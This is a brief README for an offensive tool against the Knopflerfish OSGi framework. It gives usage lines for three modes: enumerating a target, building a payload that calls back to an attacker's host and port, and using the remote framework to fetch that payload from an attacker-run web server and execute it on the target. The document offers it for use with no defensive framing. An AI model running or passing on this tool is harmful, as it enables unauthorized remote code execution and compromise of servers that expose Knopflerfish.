#KFFT
Knopflerfish Attack tool

KFT usage and "modes"
Mode 1 runs an enum scan
-Checks for default bundle info, HTTPConsole, and if the remote framework is running
-Usage: python knopflerfucktool.py 1 <rhost> <rport>
Mode 2 outputs a payload to upload however you like
-Usage: python knopflerfucktool.py 2 <lhost> <lport>
-This mode also makes the payload needed for mode 3
-Requires openJDK 1.8.0 and Eclipse Equinox (eceq.jar)
Mode 3 uses the KF Remote Framework to upload and run a payload
-Usage: python knopflerfucktool.py 3 <rhost> <rport> <srvhost> <srvport> <lport>
-This mode needs the payload from mode 2
-The payload needs to be host on the web root of http://<srvhost>:<srvport>/
